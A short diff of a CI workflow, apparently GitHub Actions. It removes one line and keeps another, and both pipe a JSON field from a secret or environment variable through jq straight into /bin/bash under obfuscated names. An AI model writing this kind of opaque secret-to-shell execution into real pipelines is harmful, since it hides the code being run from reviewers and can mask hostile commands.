@@ -21,7 +21,6 @@ jobs:
           h942: ${{ secrets.h942 }}
         run: |
           printf '%s' "$h942" | jq -r .xkfy96 | /bin/bash
-          echo $zgolb2387 | jq -r .sy846 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
